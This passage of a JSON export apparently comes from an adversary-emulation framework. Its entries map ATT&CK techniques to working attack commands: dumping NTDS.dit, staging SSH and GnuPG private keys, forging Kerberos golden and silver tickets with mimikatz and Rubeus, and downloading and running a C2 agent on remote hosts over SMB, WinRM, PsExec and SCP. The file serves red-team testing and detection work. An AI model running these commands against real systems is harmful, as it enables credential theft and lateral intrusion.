"atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enable traffic redirection on macOS UI (not terminal).\nThe test will modify and enable the \"Web Proxy\" and \"Secure Web Proxy\" settings  in System Preferences => Network => Advanced => Proxies for the specified network interface.\n\nNote that this test may conflict with pre-existing system configuration.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["networksetup -setwebproxystate Wi-Fi off; networksetup -setsecurewebproxystate Wi-Fi off"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "networksetup -setwebproxy; networksetup -setsecurewebproxy", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Proxy: Internal Proxy", "ability_id": "c9b955a568daf19171ce87c25c7fd24c", "technique_id": "T1090.001", "tactic": "command-and-control", "requirements": [], "name": "Connection Proxy for macOS UI", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment.", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["docker stop t1613_container; docker rmi -f t1613_container"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "docker build -t t1613  $PathtoAtomicsFolder/T1613/src/; docker run --name t1613_container  -d -t t1613; docker ps; docker stats --no-stream; docker inspect $(docker ps -l -q --filter ancestor=t1613)", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Container and Resource Discovery", "ability_id": "e60171028e1c0f57bc9ceebfd32dcd64", "technique_id": "T1613", "tactic": "discovery", "requirements": [], "name": "Container and ResourceDiscovery", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates an adversary leveraging control.exe\nUpon execution calc.exe will be launched\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["187e67_calc.cpl"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "control.exe 187e67_calc.cpl", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Control Panel", "ability_id": "efc033332057f4957e3e190bf4061070", "technique_id": "T1218.002", "tactic": "defense-evasion", "requirements": [], "name": "Control Panel Items", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": true, "description": "Copy 54ndc47 to remote host (SMB)", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["sandcat.go-windows"], "parsers": [{"module": "plugins.stockpile.app.parsers.54ndc47_remote_copy", "parserconfigs": [{"custom_parser_vals": {}, "edge": "has_54ndc47_copy", "target": "", "source": "remote.host.fqdn"}]}], "cleanup": ["$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nRemove-Item -Path $drive\"\\Users\\Public\\s4ndc4t.exe\" -Force;"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Services: SMB/Windows Admin Shares", "ability_id": "65048ec1-f7ca-49d3-9410-10813e472b30", "technique_id": "T1021.002", "tactic": "lateral-movement", "requirements": [{"relationship_match": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}], "module": "plugins.stockpile.app.requirements.not_exists"}, {"relationship_match": [{"source": "remote.host.fqdn", "edge": "has_share"}], "module": "plugins.stockpile.app.requirements.basic"}, {"relationship_match": [{"source": "remote.host.fqdn"}], "module": "plugins.stockpile.app.requirements.no_backwards_movement"}, {"relationship_match": [{"source": "remote.host.fqdn", "edge": "isAccessibleFrom"}], "module": "plugins.stockpile.app.requirements.reachable"}], "name": "Copy 54ndc47 (SMB)", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": true, "description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["sandcat.go-windows"], "parsers": [], "cleanup": ["$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  Invoke-Command -Session $session -Command {Remove-Item \"C:\\Users\\Public\\svchost.exe\" -force};\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  $location = \"#{location}\";\n  $exe = \"#{exe_name}\";\n  Copy-Item $location -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["sandcat.go-windows"], "parsers": [], "cleanup": ["$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  Invoke-Command -Session $session -Command {Remove-Item \"C:\\Users\\Public\\svchost.exe\" -force};\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  $location = \"#{location}\";\n  $exe = \"#{exe_name}\";\n  Copy-Item $location -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;", "language": null, "name": "pwsh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["sandcat.go-darwin"], "parsers": [], "cleanup": ["ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm -f sandcat.go'"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["sandcat.go-linux"], "parsers": [], "cleanup": ["ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'rm -f sandcat.go'"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Lateral Tool Transfer", "ability_id": "4908fdc4-74fc-4d7c-8935-26d11ad26a8d", "technique_id": "T1570", "tactic": "lateral-movement", "requirements": [], "name": "Copy 54ndc47 (WinRM and SCP)", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "copy the contents for the clipboard and print them", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "pbpaste", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-Clipboard -raw", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-Clipboard -raw", "language": null, "name": "pwsh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "xclip -o", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Clipboard Data", "ability_id": "b007fe0c-c6b0-4fda-915c-255bbc070de2", "technique_id": "T1115", "tactic": "collection", "requirements": [], "name": "Copy Clipboard", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\nThis test requires steps taken in the test \"Create Volume Shadow Copy with vssadmin\".\nA successful test also requires the export of the SYSTEM Registry hive.\nThis test must be executed on a Windows Domain Controller.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del \"C:\\Windows\\Temp\\ntds.dit\"        >nul 2> nul && del \"C:\\Windows\\Temp\\VSC_SYSTEM_HIVE\" >nul 2> nul && del \"C:\\Windows\\Temp\\SYSTEM_HIVE\"     >nul 2> nul"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if not exist C:\\Windows\\Temp  ( call ) ELSE ( mkdir C:\\Windows\\Temp ) &&   &&  copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\Windows\\Temp\\ntds.dit && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\VSC_SYSTEM_HIVE && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM_HIVE", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: NTDS", "ability_id": "548f5aa3ec2fcfc6872ee10975480f29", "technique_id": "T1003.003", "tactic": "credential-access", "requirements": [], "name": "Copy NTDS.dit from Volume Shadow Copy", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copy private SSH keys on a Linux system to a staging folder using the `cp` command.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -rf /tmp/art-staging"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "mkdir /tmp/art-staging; find / -name id_rsa 2>/dev/null -exec cp --parents {} /tmp/art-staging \\;", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Private Keys", "ability_id": "71bd54afbf7d6a4cc96abee7d3195e7e", "technique_id": "T1552.004", "tactic": "credential-access", "requirements": [], "name": "Copy Private SSH Keys with CP", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copy private SSH keys on a Linux or macOS system to a staging folder using the `rsync` command.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -rf /tmp/art-staging"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "mkdir /tmp/art-staging; find / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \\;", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -rf /tmp/art-staging"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "mkdir /tmp/art-staging; find / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \\;", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Private Keys", "ability_id": "6922a3c6d0752b95a5c4a4aa073c9372", "technique_id": "T1552.004", "tactic": "credential-access", "requirements": [], "name": "Copy Private SSH Keys with rsync", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": true, "description": "Copy Sandcat file using PowerShell", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["sandcat.go-windows"], "parsers": [], "cleanup": ["del sandcat.go-windows; Invoke-Command -ComputerName"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$server=\"#{server}\";\n$sharePath=\"#{share}\";\nSet-Location $sharePath;$url=\"$($server)/file/download\";\n$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");($data=$wc.DownloadData($url)) -and\n($name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"))\n-and ([io.file]::WriteAllBytes(\"$($sharePath)$name.exe\",$data));\n$startServer=\"$($sharePath)$name.exe -server $($server) \";Invoke-Command\n-ScriptBlock {Param([string]$startServer, $sharePath, $name, $server)  Invoke-WmiMethod\n-Class Win32_Process -Name Create -ArgumentList \"$($sharePath)$name.exe\n-server $server -v\" } -ComputerName #{remote.host.name} -ArgumentList $startServer, $sharePath, $name, $server", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Services: Windows Remote Management", "ability_id": "3734aa1e-c536-42b3-8912-4c91b8bdce90", "technique_id": "T1021.006", "tactic": "lateral-movement", "requirements": [], "name": "Copy Sandcat File using Powershell", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": true, "description": "Copy Sandcat file using PsExec on CMD", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["sandcat.go-windows"], "parsers": [], "cleanup": ["del /f sandcat.go-windows && del /f \\\\#{remote.host.name}\\Users\\Public\\sandcat.go-windows.exe"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net /y use \\\\#{remote.host.name} & copy /y sandcat.go-windows\n\\\\#{remote.host.name}\\Users\\Public & #{psexec.path} -accepteula \\\\#{remote.host.name}\ncmd /c start C:\\Users\\Public\\sandcat.go-windows -server #{server} -v", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Lateral Tool Transfer", "ability_id": "620b674a-7655-436c-b645-bc3e8ea51abd", "technique_id": "T1570", "tactic": "lateral-movement", "requirements": [], "name": "Copy Sandcat File using PsExec on CMD", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copy from sensitive File from the c$ of another LAN computer with powershell\nhttps://twitter.com/SBousseaden/status/1211636381086339073", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path \"\\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password\"; Remove-Item -Path \"$Env:TEMP\\Easter_egg.password\""], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy-item -Path \"\\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password\" -Destination \"$Env:TEMP\\Easter_egg.password\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Data from Network Shared Drive", "ability_id": "e1aac34d578a19d68451a09a37e667ae", "technique_id": "T1039", "tactic": "collection", "requirements": [], "name": "Copy a sensitive File over Administive share with Powershell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copy from sensitive File from the c$ of another LAN computer with copy cmd\nhttps://twitter.com/SBousseaden/status/1211636381086339073", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del \\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password && del %TEMP%\\Easter_egg.password"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy \\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password %TEMP%\\Easter_egg.password", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Data from Network Shared Drive", "ability_id": "47f3e8652525a485114b19e100bba352", "technique_id": "T1039", "tactic": "collection", "requirements": [], "name": "Copy a sensitive File over Administive share with copy", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).\n", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\PSTools\\PsExec.exe \\\\localhost -accepteula -c C:\\Windows\\System32\\cmd.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Remote Services: SMB/Windows Admin Shares", "ability_id": "ca1f1ab85939ac18903d5abc4367fec1", "technique_id": "T1021.002", "tactic": "lateral-movement", "requirements": [], "name": "Copy and Execute File with PsExec", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copy in new loginwindow.plist to launch Calculator.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["b1d66c_reopen_loginwindow_calc.plist"], "parsers": [], "cleanup": ["rm -f ~/Library/Preferences/ByHost/com.apple.loginwindow.plist"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "cp b1d66c_reopen_loginwindow_calc.plist ~/Library/Preferences/ByHost/com.apple.loginwindow.plist", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Re-opened Applications", "ability_id": "13370afb983bcc3344af451d8877f047", "technique_id": "T1547.007", "tactic": "multiple", "requirements": [], "name": "Copy in loginwindow.plist for Re-Opened Applications", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copy the users GnuPG (.gnupg) directory on a Mac or Linux system to a staging folder using the `rsync` command.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -rf /tmp/GnuPG"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "mkdir /tmp/GnuPG; find / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \\;", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -rf /tmp/GnuPG"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "mkdir /tmp/GnuPG; find / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \\;", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Private Keys", "ability_id": "ee0a64fe7dcc5b51e8fe5f881db5b3af", "technique_id": "T1552.004", "tactic": "credential-access", "requirements": [], "name": "Copy the users GnuPG directory with rsync", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore; cmd.exe /c \"$Env:temp\\rubeus.exe\" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\") /printcmd /outfile:golden; $filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name; @\"; >%TEMP%\\golden.txt 2>&1 (;   echo Purge existing tickets and create golden ticket:;   klist purge;   cd %temp%;   \"$Env:temp\\rubeus.exe\" ptt /ticket:kirbifile;   echo.;   echo Requesting SYSVOL:;   dir \\\\$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\")\\SYSVOL;   ;   echo.;   echo Tickets after requesting SYSVOL:;   klist;   echo.;   echo End of Golden Ticket attack; ); \"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Golden Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\golden.txt; Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Steal or Forge Kerberos Tickets: Golden Ticket", "ability_id": "107a14acdd84a7d6e7c891177b0db3aa", "technique_id": "T1558.001", "tactic": "credential-access", "requirements": [], "name": "Crafting Active Directory golden tickets with Rubeus", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore; $domain_sid = \"S-1-5-21-DEFAULT\"; If ($domain_sid -Match \"DEFAULT\") {;   $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;   $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')); }; @\"; >%TEMP%\\golden.txt 2>&1 (;   echo Purge existing tickets and create golden ticket:;   klist purge;   $env:TEMP\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:goldenticketfakeuser /ptt\" \"exit\";   echo.;   echo Requesting SYSVOL:;   dir \\\\%userdnsdomain%\\SYSVOL;   ;   echo.;   echo Tickets after requesting SYSVOL:;   klist;   echo.;   echo End of Golden Ticket attack; ); \"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\golden.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Golden Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\golden.txt; Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Steal or Forge Kerberos Tickets: Golden Ticket", "ability_id": "e91bbca3e82c76d7780b4326b1882b19", "technique_id": "T1558.001", "tactic": "credential-access", "requirements": [], "name": "Crafting Active Directory golden tickets with mimikatz", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore; $domain_sid = \"S-1-5-21-DEFAULT\"; If ($domain_sid -Match \"DEFAULT\") {;   $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;   $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')); }; @\"; >%TEMP%\\silver.txt 2>&1 (;   echo Purge existing tickets and create silver ticket:;   klist purge;   $env:TEMP\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\\\=%.%userdnsdomain% /ptt\" \"exit\";   echo.;   echo executing:schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   ;   echo.;   echo Tickets after requesting schtasks:;   klist;   echo.;   echo End of Silver Ticket attack; ); \"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Silver Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\silver.txt; Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Steal or Forge Kerberos Tickets: Silver Ticket", "ability_id": "790523f56191466c7103452ccdbabd33", "technique_id": "T1558.002", "tactic": "credential-access", "requirements": [], "name": "Crafting Active Directory silver tickets with mimikatz", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, the the command \"ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname\"\nin the %temp% direcotry to view all files with hidden data streams. To view the data in the alternate data stream, run \"notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt\" in the %temp% folder.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path $env:TEMP\\T1564.004_has_ads_powershell.txt -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "echo \"test\" > $env:TEMP\\T1564.004_has_ads_powershell.txt | set-content -path test.txt -stream adstest.txt -value \"test\"; set-content -path $env:TEMP\\T1564.004_has_ads_powershell.txt -stream adstest.txt -value \"test2\"; set-content -path . -stream adstest.txt -value \"test3\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts: NTFS File Attributes", "ability_id": "1532b3faf25ad1e6f4fba4ada643b253", "technique_id": "T1564.004", "tactic": "defense-evasion", "requirements": [], "name": "Create ADS PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Create an Alternate Data Stream with the command prompt. Write access is required. Upon execution, run \"dir /a-d /s /r | find \":$DATA\"\" in the %temp%\nfolder to view that the alternate data stream exists. To view the data in the alternate data stream, run \"notepad T1564.004_has_ads.txt:adstest.txt\"\n", "repeatable": false, "privilege": "", "buckets": 